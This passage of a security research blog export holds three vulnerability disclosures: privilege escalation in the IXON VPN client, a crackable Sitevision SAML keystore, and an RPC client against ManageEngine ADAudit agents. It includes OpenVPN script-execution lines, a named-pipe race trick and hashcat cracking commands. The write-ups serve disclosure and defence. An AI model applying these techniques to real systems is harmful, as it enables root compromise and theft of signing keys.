Consultant","tags":null,"title":"Robin Karlberg","type":"employees"},{"authors":null,"categories":null,"content":" TL;DR This post will describe three new vulnerabilities CVE-2025-26168, CVE-2025-26169 and CVE-2025-TBA which were found in the IXON VPN client. These vulnerabilities result in Local Privilege Escalation on Windows and Linux, in addition to a quite interesting [REDACTED].\nCVE IDs were requested for the vulnerabilities, but none have been assigned yet due to current funding limitations and a backlog at MITRE. This article will be updated as soon as CVE IDs are allocated.\nFollow along for the full disclosure.\nBackground Welcome, hope your coffee is warm and your local weather is good etc, etc. During a recent security assessment, Shelltrail was provided access to an environment through a cloud VPN provider, namely IXON. IXON is a Dutch company specializing in devices and remote access to industrial systems.\nTo use the IXON VPN, the user must purchase a physical remote access device and connect it to a network via Ethernet. The IXON device calls back to a cloud environment over the internet provided via Ethernet or mobile data. Once installed and setup, the user can access a cloud portal to establish a VPN connection, enabling secure access to the local network where the device is deployed.\nAt least for a pentester, a lot of questions now need answers before a restful night\u0026rsquo;s sleep can be justified.\nUnder-the-hood So in order to connect to a IXON VPN device their proprietary VPN client must be installed. This client is downloaded from https://ixon.cloud, the same location where the user initiates the VPN connection from. This cloud portal requires the user to provide username and password (and additionally MFA) and the user must be invited to access a specific IXON VPN device.\nSo we now know that some kind of interaction must happen between the https://ixon.cloud web page and the locally installed VPN client.\nBy enumerating the installed VPN client it was discovered that a local web server was running on https://localhost:9250. This was found to be a custom compiled C-binary which enables a local user configuration options for the VPN client.\n$ file /etc/ixon/vpn_client/vpn_client /etc/ixon/vpn_client/vpn_client: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=032477110a2d9103328159ac17cbf0bdf18f9b91, stripped This vpn_client, at least on Linux runs as a systemd service:\n$ systemctl status ixon_vpn_client.service ? ixon_vpn_client.service - VPN Client (IXON Remote Service) Loaded: loaded (/etc/systemd/system/ixon_vpn_client.service; enabled; preset: disabled) Active: active (running) since Tue 2025-01-28 10:17:54 CET; 3 weeks 0 days ago Invocation: 5ccedc9d3ed4485983755fcba25deae0 Main PID: 113045 (vpn_client) Tasks: 8 (limit: 16628) Memory: 10.8M (peak: 13.6M) CPU: 645ms CGroup: /system.slice/ixon_vpn_client.service ??113045 /etc/ixon/vpn_client/vpn_client And it is running as root:\n$ ps auxww | grep vpn_client root 113045 0.0 0.1 747844 16976 ? Ssl 00:22 0:00 /etc/ixon/vpn_client/vpn_client For instance, this Web UI allows a local user to set up a Proxy server, specify VPN Connection Type, modify OpenVPN TAP adapter settings or change which certificates the web server should be running with.\nThis gives a good idea on how the https://ixon.cloud may interact with the locally installed VPN client and also that we\u0026rsquo;re dealing with OpenVPN as our underlying VPN software.\nConnection establishment So, upon clicking connect on a VPN device in the https://ixon.cloud an XHR request is sent by JavaScript from the users browser to the https://localhost:9250 web service:\nPOST /connect HTTP/1.1 Host: localhost:9250 Api-Access-Token: a[..REDACTED_ACCESS_TOKEN..]b Api-Version: 2 Vpn-Client-Controller-Identifier: a[..REDACTED..]b User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Content-Type: application/json Origin: https://portal.ixon.cloud Referer: https://portal.ixon.cloud/ { \u0026#34;companyId\u0026#34;:\u0026#34;a[..REDACTED..]b\u0026#34;, \u0026#34;agentId\u0026#34;:\u0026#34;a[..REDACTED..]b\u0026#34; } This request contains three important entries. Api-Access-Token, companyId and agentId. These three pieces make up the authentication and authorization to whether or not a connection should be allowed.\nThe Api-Access-Token is the same authentication bearer which is used in https://ixon.cloud and the agentId refers to which IXON VPN device the connection shall be established.\nWhen the local web server receives this request, it forwards it to https://ixon.cloud and appends local VPN client configuration details:\nPOST /api/users/me/vpn-configs?fields=agent(publicId,name,activeVpnSession(rscServer.name,vpnAddress),config(routerLan(network,netMask),routerAdditionalSubnets(networkAddress,networkMask))),company(publicId,name) HTTP/2 Host: portal.ixon.cloud Authorization: Bearer a[..REDACTED_ACCESS_TOKEN]b Api-Company: a[.:REDACTED..] Accept: application/json Api-Version: 2 User-Agent: VPN Client/1.4.2 (Linux x86_64 (Kernel 6.11.2-amd64)) { \u0026#34;type\u0026#34;:\u0026#34;openvpn\u0026#34; \u0026#34;networkLayer\u0026#34;:\u0026#34;tap\u0026#34; \u0026#34;transportProtocol\u0026#34;:\u0026#34;tcp\u0026#34; \u0026#34;agent\u0026#34;:{\u0026#34;publicId\u0026#34;:\u0026#34;[..REDACTED..]\u0026#34;} \u0026#34;addRoutes\u0026#34;:\u0026#34;true\u0026#34; \u0026#34;rsaPubKey\u0026#34;:\u0026#34;-----BEGIN RSA PUBLIC KEY-----\\n[..REDACTED..]\\n-----END RSA PUBLIC KEY-----\\n\u0026#34; } The response from this request is an OpenVPN configuration (.ovpn) which the local OpenVPN binary provided by IXON uses as connection.\nCVE-2025-TBA - [REDACTED] It has been decided that this vulnerability will not be disclosed until a public fix is available. IXON is aware of the issue; however, addressing it requires potentially impactful configuration changes. The attack is quite niche and while IXON has accepted that the vulnerability may be disclosed, Shelltrail has determined that publishing it without a proper fix would be irresponsible at this time.\nCVE-2025-26168 - IXON VPN Client Local Privilege Escalation Linux Right. So we now have a quite good understanding of the inner workings of the IXON VPN client. If you remember, that when the VPN connection is about to be established the local binary receives an OpenVPN configuration. When reviewing this hand-off, it was noted that the OpenVPN conf is temporarily stored on disk.\nBy watching the file writes of vpn_client is was found that the OpenVPN conf is stored in the /tmp directory, with a predictable name: /tmp/vpn_client_openvpn_configuration.ovpn. The pentester brain goes full throttle.\nMoreover, as soon as the VPN connection was established, the temporary OpenVPN conf was deleted.\nOpenVPN is known for being able to execute shell scripts during the connection process if a user provides up, pre or tls-verify in the configuration accompanied with a script-security level of 2.\nscript−security 2 tls−verify /tmp/script.sh [...] So if we successfully smuggle the tls-verify and script-security parameters to the OpenVPN conf we will have code execution as root.\nThe initial idea was to use the proxy feature vpn_client to replace the OpenVPN conf during transmission however this is not possible due to certificate validation in the TLS transmission.\nSecond idea was to pre-configure a OpenVPN conf at /tmp/vpn_client_openvpn_configuration.ovpn and make it immutable with chattr +i \u0026lt;file\u0026gt; so that the vpn_client cannot overwrite it. This did not work as the vpn_client process would stall if the configuration file did not have the correct file permissions.\nThe same problem arised with all types of symbolic link and chown stunts thrown at the file location.\nSome days passed and this what looked as an text-book privilege escalation was yet not solved.\nUntil\u0026hellip; We thought about pipes!\nThe mkfifo command is used to create named pipes (FIFOs) in Linux. A FIFO (First In, First Out) is a special type of file that allows for inter-process communication (IPC), where one process writes data to the pipe, and another process reads from it.\nIf a pre-created FIFO named pipe exists at the /tmp/vpn_client_openvpn_configuration.ovpn location and a VPN connection is activated the vpn_client will stall, until a OpenVPN is written to the pipe.\nThe following steps are shown in the upcoming image:\nPrints the content of /tmp/script.sh Prints the first 4 lines of a working OpenVPN configuration Creates a FIFO named pipe at the known location of the temporarily stored VPN configuration Shows that the file /tmp/root does not exist (Now the user logs in to portal.ixon.cloud and connects to a VPN device) The vpn_client binary stalls and waits for a OpenVPN configuration A malicious OpenVPN configuration is written to the named pipe and executes the supplied script as root and prints the proof to a file named /tmp/root Things to highlight here is that the OpenVPN conf need to successfully connect in order for the tls-verify script to execute. That same requirements goes for up. In order for down to execute the connection first needs to be established and then later closed.\nRunning pre connect scripts has been discussed 12 years ago and was declined due to being a security risk (https://community.openvpn.net/openvpn/ticket/284).\nThis has been proposed before and I have NACKed it due to security issues related to this approach.\nIf anyone has ideas for circumventing the connection establishment caveat feel free to drop us a message.\nCVE-2025-26169 - IXON VPN Client Local Privilege Escalation Windows Oh - I\u0026rsquo;m glad you asked. Of course there is a Windows client to have a look at.\nThe process of establishing a VPN connection works the same way as for Linux.\nThe vpn_client runs as a service in the content of NT Authority\\SYSTEM:\nAnd when connecting with the IXON VPN client the OpenVPN conf is temporarily stored in C:\\Windows\\Temp. Aaah, happy Tales from the %TEMP% like an old colleague would phrase it.\nHere comes our top 5 fun facts about %TEMP% that you can discuss at boring dinner parties:\nNT Authroity\\SYSTEM\u0026rsquo;s environment variable %TEMP% refers to C:\\Windows\\Temp Standard users, %TEMP% point to C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Temp Standard users cannot list content in C:\\Windows\\Temp Standard users can create sub-folders and files in C:\\Windows\\Temp The creator of the file or sub-folder gains full permissions. So we know the filename that will be created and deleted in the C:\\Windows\\Temp. And we can control the path prior to the service writing a OpenVPN conf to the location. Wouldn\u0026rsquo;t it be cool to use the arbitrary file delete privilege escalation technique trough Windows installer rollback as described in https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks.\nOf course it would be cool, but this requires the folder to be empty where the symlink is to be created - and that is not possible for C:\\Windows\\Temp.\nSometimes, not every idea has to be sophisticated\u0026hellip; Maybe a while loop in Powershell as a low privileged user which continuously copies our malicious OpenVPN conf to the predictable file location will result in a race condition and execution of our script.\nLets find out:\nYour browser does not support the video tag. Great success.\nSummary IXON were very responsive in the communication and remediation for the vulnerabilities. Both privilege escalations were simply resolved by moving the temporary OpenVPN conf to a folder where only high privilege users had access.\nThe [REDACTED] is yet to be fixed.\nThe vulnerabilities are tracked by IXON at https://support.ixon.cloud/s/article/Security-advisories with the ID ADV-2025-03-17.\nIXON recommend customers upgrading to version 1.4.4 or later of the VPN client.\nFollow us on LinkedIn (https://linkedin.com/company/shelltrail) for more cybersecurity related content,\nCheers\n","date":1745539200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1756166400,"objectID":"3e03e398d108fd7af95f25dd5df4cec2","permalink":"https://www.shelltrail.com/research/three-new-cves-related-to-ixon-vpn-client-resulting-in-local-privilege-escalation/","publishdate":"2025-04-25T00:00:00Z","relpermalink":"/research/three-new-cves-related-to-ixon-vpn-client-resulting-in-local-privilege-escalation/","section":"research","summary":"The post explains the process of finding and exploiting three vulnerabilities found in the IXON VPN client","tags":null,"title":"Three new vulnerabilities found related to IXON VPN client resulting in Local Privilege Escalation (LPE) and [REDACTED]","type":"research"},{"authors":null,"categories":null,"content":"TL;DR A security issue in Sitevision version 10.3.1 and older allows a remote attacker, in certain (non-default) scenarios, to gain access to the private keys used for signing SAML Authn requests. The underlying issue is a Java keystore that may become accessible and downloadable via WebDAV. This keystore is protected with a low-complexity, auto-generated password.\nThe severity of this vulnerability is difficult to assess and cannot be evaluated through Sitevision configuration, as it is up to the SAML Identity Provider (IdP) in a SAML flow whether signed Authn requests should have precedence over SAML Service Provider Metadata.\nBackground As a security consultant in Sweden you have most likely encountered Sitevision whether you know it or not. Sitevision is a Swedish based company providing a CMS solution which is used by many of Sweden\u0026rsquo;s 290 (but who is counting) municipalities as well as many other private companies and government entities internationally.\nThe product is often used as the main web site for the companies but can very well be customized to provide other types of business logics such as intranet, staff scheduling or news portals to name a few.\nThe easiest way to determine if you are dealing with a Sitevision site is to look for the SiteVisionLTM cookie or the fairly unique way of presenting URL paths:\nAuthentication speed-run Sitevision sites allow anonymous users to browse deployed websites when they are intended to be public. If sensitive information needs to be protected, authentication can be achieved in multiple ways according to their documentation. During this post we will only discuss the SAML 2 implementation.\nContent delivery (WebDAV) Sitevision leverages WebDAV to manage and deliver content to users who either browse or administer the site. WebDAV is an extension of the Hypertext Transfer Protocol (HTTP) that enables collaborative access to files on a web-server which is a fundamental feature for a CMS such as Sitevision. WebDAV can basically be explained as a file share over HTTP.\nWebDAV is an interesting attack surface as it uses custom HTTP verbs which are less commonly searched or enumerated when doing OSINT or attack surface scanning. If WebDAV is not configured properly, this may give an attacker directory listing on exposed directories.\nIn order to verify if WebDAV is used, an HTTP OPTIONS request can be sent to a known path of a web-server, and if the server responds with for instance PROPFIND, WebDAV may be in use.\nuser@bounty:~$ curl -X OPTIONS http://localhost/webdav -v [...] * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 \u0026lt; DAV: 1, 2 \u0026lt; Allow: OPTIONS, GET, HEAD, POST, DELETE, TRACE, PROPPATCH, COPY, MOVE, LOCK, UNLOCK, PROPFIND, PUT \u0026lt; MS-Author-Via: DAV \u0026lt; Content-Length: 0 \u0026lt; Date: Sun, 01 May 2022 20:13:01 GMT \u0026lt; cadaver, a Linux terminal tool for browsing WebDAV can be used in order to list content on a WebDAV instance.\nDiscovery So one rainy day, while surfing the internet aimlessly, with a leisure-oriented relaxation aura, a WebDAV instance appeared out of nothing on a random Sitevision site. Of course, one\u0026rsquo;s interest in how stuff works took precedence over the leisure surfing and the focus was switched. While looking into the WebDAV instance, it contained a folder named files. Inside this folder a file named saml-keystore revealed itself and got the spider-sense tingling.\nSo the file located at https://\u0026lt;redacted\u0026gt;/webdav/files/saml-keystore was downloaded and inspected. It sure was a Java keystore container which seemed to contain the public and private key for something named oiosaml.\nAccording to Sitevision\u0026rsquo;s documentation, the saml-keystore is used in SAML authentication flow, and the keystore which protects the private key is luckily protected with a password.\nHow SAML works requires its own blog post to be explained properly but Auth0 does a good job explaining it.\nThe saml-keystore can be viewed with Oracle\u0026rsquo;s tool keytool which is included in Java runtime environment (for instance openjdk-17-jre).\nuser@rodalacket:/$ keytool -list -keystore saml-keystore Enter keystore password: ***************** WARNING WARNING WARNING ***************** * The integrity of the information stored in your keystore * * has NOT been verified! In order to verify its integrity, * * you must provide your keystore password. * ***************** WARNING WARNING WARNING ***************** Keystore type: JKS Keystore provider: SUN Your keystore contains 1 entry oiosaml, Jan 01, PrivateKeyEntry, Certificate fingerprint (SHA-256): AA:BB:[...]:CC:EE:DD Warning: The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using \u0026#34;keytool -importkeystore -srckeystore saml-keystore -destkeystore saml-keystore -deststoretype pkcs12\u0026#34;. As seen in the above output, the saml-keystore includes an oiosaml certificate, but the password is needed to export the private key.\nAutomatically generated passwords Java keystores protect the private key with a password. This password is hashed and stored in the keystore file in SHA1 format. This hash can however be extracted from the keystore with the tool JksPrivkPrepare.jar (source):\nuser@bounty:$ java -jar ./JksPrivkPrepare.jar saml-keystore Alias: oiosaml, algorithm: RSA, keysize or field size: 2048 $jksprivk$*1234[...REDACTED...]5678*oiosaml By extracting the password hash from the keystore one is able to attempt to crack the hash offline using brute force in an attempt to gain access to the plaintext password. Just for fun, this hash was put on a hashcat password cracking rig with 5 x RTX 3080:\nuser@rodalacket:$ hashcat -m 15500 -a 3 saml-keystore.hash ?a?a?a?a?a -w 3 -O -m 15500 to specify SHA1 hash according to java keystore specifications\n-a 3 instructing hashcat to perform brute force attack\n?a?a?a?a?a hashcat mask scheme; Meaning all printable ASCII characters with the length of 5.\n-w 3 calling Tuned performance profile\n-O using optimized kernels\n5 characters ran quick and no password was cracked. 6 characters ran quick and no password was cracked. 7 characters ran quick and no password was cracked. 8 characters began to make the RTX sweat a bit but resulted in a successful password crack! Oh, we now have the private key for the oiosaml key pair. This indicates that the auto-generation of passwords for the saml-keystore does not comply with a strong password complexity. By further examining the password it was determined to be limited to digits and lowercase characters with the length of 8.\nWith this low complexity schema it is possible to crack the password on a 4 vCPU i7 virtual machine in less than 15 hours.\nhashcat -m 15500 -a 3 saml-keystore.hash -1 ?d?l ?1?1?1?1?1?1?1?1 -w 3 -O The initial assumption when obtaining this key pair was that it could be used to sign arbitrary SAMLResponse authentication messages and craft arbitrary logins for the Sitevision site. This was however NOT the case.\nAfter input from Sitevision employees it was made clear that this key pair is used to sign SAML Authn requests. An Authn request is the initial request that starts the SAML flow and is created by the Service Provider (SP), and sent to the Identity Provider (IdP). This request may or may not be signed and signing is not required by the SAML specification (defined in the OASIS SAML 2.0 standard), but it is recommended for security reasons and may be required by specific Identity Providers (IdPs).\nImpact The Authn request that initiates the SAML flow is created by the Service Provider (which in this case is the Sitevision server) and contains a number of XML attributes. The important one to note here is the AssertionConsumerServiceURL. This attribute handles, and to quote Auth0:\nThe SAML URL interface of the service provider, where the Identity provider sends the authentication token\nBasically meaning that the URL specified in the AssertionConsumerServiceURL is the location where the final authentication token is sent. An attacker who manipulates this attribute, and initiates that SAML flow but lets a victim log in via the IdP will gain access to the victim\u0026rsquo;s authenticated session.\nThe SAML 2.0 Technical Overview explains that the IdP consults its list of trusted service providers in metadata before issuing the authentication response. This process involves verifying that the AssertionConsumerServiceURL in the Authn request matches the pre-registered endpoint for the SP. If the Authn request is signed and the signature is valid, the IdP can trust the AssertionConsumerServiceURL specified in the request. However, it is not clear if the pre-configured metadata or signed request have precedence.\nSummary The weak auto-generated password was a default configuration of Sitevision until the discovery of this attack chain. An increased password complexity is enforced from version 10.3.2 and higher. Password rotation is however not performed upon upgrading Sitevision, leaving Sitevision sites without manual password rotation vulnerable. The exposure of the saml-keystore is dependent on the configuration of the Sitevision site and is not default, but common.\nDisclosure and remediation This vulnerability was reported to Sitevision with the following timeline:\n2022-05-02: Andreas Vikerup reported the vulnerability to Sitevision via email. 2022-05-02: Sitevision confirms that the report was received and the vulnerability was verified. 2022-05-05: Sitevision 10.3.2 released. Affected customers notified. 2022-05-06: Agreement on more than 90 days disclosure due to the sensitive nature of the Sitevision systems. 2022-07-04: Request for CVE at mitre.org by Andreas Vikerup. 2022-07-21: CVE-2022-35202 received however never published. Since the 21th of July 2022 the CVE has been in a reserved state as no public information exists for the vulnerability. Customers were notified via email and information regarding the vulnerability was exclusively available to authorized users through the Sitevision customer web portal. The absence of publicly available information poses a challenge, as it hinders the ability to reference a known vulnerability and obtain the necessary details.\nAs Sitevision CMS servers provide the Swedish nation with critical services such as the Swedish Tax Agency, a 90 day disclosure policy was deemed to short. If this vulnerability became public prior to systems being patched and mitigated potential illicit activity could have been performed.\nPrior to publication of this blog post Sitevision employees made an effort to contact all customers with vulnerable configurations multiple times as some sites still weren\u0026rsquo;t mitigated properly even after more than 2 years passing.\nThanks to Sitevision for professional communication and special thanks to CERT-SE (Swedens national Cyber Security Incident Response Team) for providing recommendations in terms of publishing content that may impact national infrastructure.\nFollow us on LinkedIn (https://linkedin.com/company/shelltrail) for more cybersecurity related content,\nCheers\n","date":1739145600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1739145600,"objectID":"52491e7631a9efdf210ba5a72d4fa749","permalink":"https://www.shelltrail.com/research/how-auto-generated-passwords-in-sitevision-leads-to-signing-key-leakage-cve-2022-35202/","publishdate":"2025-02-10T00:00:00Z","relpermalink":"/research/how-auto-generated-passwords-in-sitevision-leads-to-signing-key-leakage-cve-2022-35202/","section":"research","summary":"A security issue in Sitevision version 10.3.1 and older allows remote attacker, in certain scenarios, to gain access signing keys used for Authn SAML requests.","tags":null,"title":"How auto-generated passwords in Sitevision leads to signing key leakage - CVE-2022-35202","type":"research"},{"authors":null,"categories":null,"content":"TL;DR This research consist of three parts covering different areas namely developing a custom RPC client, reverse engineering and a bit of cryptography.\nWhen this research started, the objective was actually to find a new way to leverage an old CVE, however digging into the product a new rabbit hole appeared, leading to a new vulnerability.\nThis part of the research explains intricate parts of Remote Procedure Calls (RPC) in Windows environments and how to develop a custom client.\nCVEs:\nhttps://nvd.nist.gov/vuln/detail/CVE-2024-36036 https://nvd.nist.gov/vuln/detail/CVE-2024-36037 Background ManageEngine is a company with around 50 different products ranging from full SIEM solutions to Mobile Device Management systems with 280 000+ customers world-wide. This article will deep-dive into ADAudit Plus, which is a product used for real-time monitoring of Active Directory, Windows file servers and Windows configuration change auditing.\nADAudit can remotely access event logs and other statistics using standard remote interaction tools available in Windows. However, for comprehensive visibility and specialized functions on the targeted machines, it is necessary to install an agent on the audited Windows systems, specifically the ADAuditPlusAgent.\nWhen this research started, the objective was actually to find a new way to leverage an old CVE, however digging into the product a new rabbit hole appeared, leading to a new vulnerability..\nAs the old CVE was fixed, the research had to be conducted on an older version of ADAudit, more precisely the version 7050 released December 2021\nManageEngine have a penchant for building applications on top of Tomcat with Java which makes it a good target to practice some source code analysis and reverse engineering. Lets begin digging.\nMethodology For those who are not familiar with Java and decompiling, here is Shelltrail\u0026rsquo;s methodology:\nFind all .jar files you would like to assess and download them to your Unix host. The jar files will most likely be stored in the installation directory of the product that is being assessed.\nuser@adpen1:~/adaudit/7$ ls -la total 8036 drwxr-xr-x 2 user user 4096 Dec 1 08:36 . drwxr-xr-x 5 user user 4096 Dec 1 08:35 .. -rw-r--r-- 1 user user 997934 Dec 1 08:36 AdventNetADAPClient.jar -rw-r--r-- 1 user user 12040 Dec 1 08:36 AdventnetADAPFilter.jar -rw-r--r-- 1 user user 139792 Dec 1 08:36 AdventNetADAPJspClient.jar -rw-r--r-- 1 user user 4534195 Dec 1 08:36 AdventnetADAPServer.jar -rw-r--r-- 1 user user 15735 Dec 1 08:36 AdventnetADAPService.jar -rw-r--r-- 1 user user 68066 Dec 1 08:36 AdventnetADAPStartUp.jar -rw-r--r-- 1 user user 686147 Dec 1 08:36 AdventNetClientComponents.jar -rw-r--r-- 1 user user 290027 Dec 1 08:36 AdventNetClientFramework.jar -rw-r--r-- 1 user user 65094 Dec 1 08:36 AdventNetIdiomsGallery.jar -rw-r--r-- 1 user user 294662 Dec 1 08:36 AdventNetNPrevalent.jar -rw-r--r-- 1 user user 104252 Dec 1 08:36 AdventNetRssLibrary.jar -rw-r--r-- 1 user user 157667 Dec 1 08:36 AdventNetTableComponents.jar -rw-r--r-- 1 user user 781984 Dec 1 08:36 AdventNetUpdateManagerInstaller.jar -rw-r--r-- 1 user user 22935 Dec 1 08:36 AdventNetWebClientCore.jar -rw-r--r-- 1 user user 13413 Dec 1 08:36 AdventNetWebClientRangeNavigator.jar -rw-r--r-- 1 user user 13809 Dec 1 08:36 AdventNetWebClientTree.jar Jar-files is an acronym for Java Archive. It is a file format based on the popular ZIP file format and is used for archiving many files into one.\nSo yes, it is possible to extract the jar file with a zip tool and retrieve the content:\nuser@adpen1:~/adaudit/7$ 7z l AdventNetADAPClient.jar [...] 2021-12-30 21:37:22 D.... 0 0 com/adventnet/sym/adsm/common/webclient/tracker 2021-12-30 21:37:22 D.... 0 0 com/adventnet/sym/adsm/common/webclient/tree 2021-12-30 21:37:22 D.... 0 0 com/adventnet/sym/adsm/common/webclient/util 2021-12-30 21:37:22 ..... 3836 1804 com/adventnet/sym/adsm/auditing/webclient/compliance/ComplianceDEReportHandler.class 2021-12-30 21:37:22 ..... 43842 17323 com/adventnet/sym/adsm/auditing/webclient/compliance/ComplianceReportHandler.class 2021-12-30 21:37:22 ..... 1857 764 com/adventnet/sym/adsm/auditing/webclient/ember/api/ADAPAPIServlet.class 2021-12-30 21:37:22 ..... 1884 774 com/adventnet/sym/adsm/auditing/webclient/ember/api/ADAPAgentAPIServlet.class [...] This will give you the class files stored in the Jar, however class files are Java code compiled into Java bytecode which is interpreted by Java Virtual Machine (JVM) and therefore is not human readable.\njd-gui is a good tool for decompiling individual Jar files into a human readable format for analysis but it does not scale well when you have many files.\nTo automate this process, jd-cli can be used to unzip and decompile the Jar files - making them searchable and viewable.\nuser@adpen1:~/adaudit/7$ jd-cli *.jar 09:51:11.097 INFO com.github.kwart.jd.cli.Main - Decompiling AdventNetADAPClient.jar 09:51:11.107 INFO com.github.kwart.jd.output.ZipOutput - ZIP file output will be initialized - AdventNetADAPClient.src.jar 09:51:14.930 INFO com.github.kwart.jd.output.ZipOutput - Finished with 129 class file(s) and 1 resource file(s) written. [...] user@adpen1:~/adaudit/7$ mkdir src user@adpen1:~/adaudit/7$ cd src user@adpen1:~/adaudit/7/src$ find ../ -name \u0026#39;*src.jar\u0026#39; -exec unzip -o {} \\; Archive: ../AdventNetUpdateManagerInstaller.src.jar inflating: META-INF/MANIFEST.MF inflating: com/adventnet/tools/update/installer/images/context_help.png inflating: com/adventnet/tools/update/installer/images/context_install.png inflating: com/adventnet/tools/update/installer/images/error.png inflating: com/adventnet/tools/update/installer/images/help_icon.png inflating: com/adventnet/tools/update/installer/images/import.png inflating: com/adventnet/tools/update/installer/images/info.png [...] From this point, the analysis of the source code could be initiated.\nDiscovery What shifted the focus from the initial target was the interest in the functionality to interact and fetch information from Windows machines with the ADAuditPlusAgent installed. The ADAuditPlusAgent has many features which can be activated from the ADAudit server, one of these are a so called SessionMonitoring feature. This feature starts a process that takes screenshots at a set interval, and sends them to the central server. This allows the server to create videos of configuration state changes and connect them with events. As an example it is possible for the low privileged user in the agent machine can get a video session of an administrator deleting a critical configuration file.\nSounds like a fun feature to review, doesn\u0026rsquo;t it?\nWhen enabling the SessionMonitoring feature from the ADAudit server while analysing all the traffic sent to the agent with wireshark an RPC interaction via named pipes was discovered.\nHmm interesting! Lets first dwelve into the history of DCE RPC.\nDCE RPC / MSRPC DCE RPC or Distributed Computing Environment Remote Procedure Call is a protocol used in client to server interactions and is general term in computer science and not something only available on Windows Systems.\nMicrosoft however wanted their own flavour and developed MSRPC (Microsoft Remote Procedure Call) with the introduction of Windows NT, first released in 1993. RPC is an old protocol but it is the foundation of how inter-computer communication works in Windows environments.\nSo basically how RPC works is that a Interface Definition Language (IDL) is defined that exposes procedures to clients. The IDL also defines how the client should interact with parameters such as a UUID, version and optionally a handle.\n[ uuid(7a98c250-6808-11cf-b73b-00aa00b677a7), version(1.0), implicit_handle(handle_t ImplicitHandle) ] interface hello { void HelloProc([in, string] unsigned char * pszString); void Shutdown(void); } The first part which is called the IDL header. This header should contain a UUID to not conflict with other RPC interfaces, a version number, and can utilize three different handles; explicit, implicit and automatic.\nThe second part, also known as the IDL body states the procedures that the client can interact with.\nWhen connecting to the server a binding to the RPC interface must be initialized. This can be either ncacn_ip_tcp, ncalrpc or ncacn_np\nncacn_ip_tcp uses plain TCP communication to interact with the server. For this binding to work the RPC server must be configured with a static TCP port that is reachable. This does not require authentication in order to establish a connection to the RPC, leaving all authentication responsibility to the exposed procedure on the server. The initial connection to the RPC is done over TCP/135.\nExample: ncacn_ip_tcp:100.64.5.212[49670]\nncalrpc is used for local RPC interactions which should not be exposed over the network.\nExample: ncalrpc:[LRPC-dfdb2238aff756a07c]\nncacn_np Lets the client and server negotiate TCP port for interaction and the negotiation occurs over SMB. Meaning this type of binding requires username and password to connect to SMB, if anonymous sessions are not enabled.\nExample: ncacn_np:100.64.5.212[\\pipe\\hello]\nExploitation What we know up to this part is actually only that the ADAudit server is using RPC to interact with the Agents over a named pipe called ADAPAgentRpcPipe as seen in the wirehark screenshot.\nWhat we now need to do is:\nCreate a valid IDL structure Brew a large can of coffee Build an RPC client Guess a lot Create input data that will be marshalled into a valid stub that servers RPC interface will act on. Lets begin with the IDL structure. RpcView have everything we need to accomplish this step as the tool can decompile the IDL structure from the RPC interface. This tool should be executed on the server exposing the RPC interface:\nGet the Visual Studio 2022 installer from https://visualstudio.microsoft.com/downloads/\nChoose to install Desktop developments with C++\nMake sure Windows SDK is selected as this packages contains the necessary components to craft the RPC client:\nFire up a Visual Studio 2022 and initiate a C++ console app project.\nStart by changing the project build options to Release and x64 in order to not require debug runtime libraries when running the compiled binary outside of the build machine.\nCreate a file named ADAPAgentRpcPipe.idl in the Source Files structure in Visual Studio:\nCopy the decompiled IDL structure which was exported by RpcView to the newly created file.\n[ uuid(7a98c250-6808-11cf-b73b-00aa00b677a7), version(1.0), ] interface DefaultIfName { void Proc0( [in]long arg_0, [in][out]long* arg_1); void Proc1( [in]long arg_0, [in][string] wchar_t* arg_1, [in][out]long* arg_2); void Proc2( [in][out]long* arg_0, [in][out]long* arg_1); } Right click the file in Visual Studio and choose compile - Visual Studio will use midl.exe to compile the IDL file into C code which will handle the appropriate marshalling operations.\nMarshalling is the process of converting data objects and parameters into a state that can be transmitted over a network. This is crucial when transporting complex data structures.\nThe data sent to the RPC server when pushing commands to the ManageEngine ADAudit Agent can actually be viewed in the DCERPC request in the Stub data section. An exception to this visibility is if the server defaults to SMB3, then event the Stub data section is encrypted. In the following image the server is using SMB2:\nBack to the project; after compiling of the IDL structure there should now be three new files in the visual studio project folder:\nADAPAgentRpcPipe_c.c: _c for client ADAPAgentRpcPipe_h.h: _h for header ADAPAgentRpcPipe_s.c: _s for server Create a valid IDL structure. Done. Next up, coffee:\nBrew a large can of coffee With the IDL structure complete and coffee ready the next step is to build the RPC client. Microsoft provides example code specifying how to build an RPC client and server application. The public code will be used as a skeleton for our ADAuditRPC-client so it is copied to a file named adauditrpc-client.cpp under Source Files in Visual Studio (use any existing main cpp file or create a new one)\nExample code:\n/* file: helloc.c */ #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026#34;hello.h\u0026#34; #include \u0026lt;windows.h\u0026gt; void main() { RPC_STATUS status; unsigned char * pszUuid = NULL; unsigned char * pszProtocolSequence = \u0026#34;ncacn_np\u0026#34;; unsigned char * pszNetworkAddress = NULL; unsigned char * pszEndpoint = \u0026#34;\\\\pipe\\\\hello\u0026#34;; unsigned char * pszOptions = NULL; unsigned char * pszStringBinding = NULL; unsigned char * pszString = \u0026#34;hello, world\u0026#34;; unsigned long ulCode; status = RpcStringBindingCompose(pszUuid, pszProtocolSequence, pszNetworkAddress, pszEndpoint, pszOptions, \u0026amp;pszStringBinding); if (status) exit(status); status = RpcBindingFromStringBinding(pszStringBinding, \u0026amp;hello_ClientIfHandle); if (status) exit(status); RpcTryExcept { HelloProc(pszString); Shutdown(); } RpcExcept(1) { ulCode = RpcExceptionCode(); printf(\u0026#34;Runtime reported exception 0x%lx = %ld\\n\u0026#34;, ulCode, ulCode); } RpcEndExcept status = RpcStringFree(\u0026amp;pszStringBinding); if (status) exit(status); status = RpcBindingFree(\u0026amp;hello_IfHandle); if (status) exit(status); exit(0); } /******************************************************/ /* MIDL allocate and free */ /******************************************************/ void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len) { return(malloc(len)); } void 